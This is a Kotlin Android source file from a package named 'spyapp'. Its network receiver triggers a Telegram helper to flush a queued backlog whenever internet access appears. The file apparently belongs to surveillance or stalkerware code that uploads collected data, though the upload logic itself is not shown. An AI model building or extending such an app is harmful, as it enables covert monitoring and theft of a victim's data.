package com.hackernight.spyapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities

class NetworkReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork
        val caps = network?.let { cm.getNetworkCapabilities(it) }
        if (caps?.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) == true) {
            TelegramHelper.flushQueueIfOnline(context)
        }
    }
}
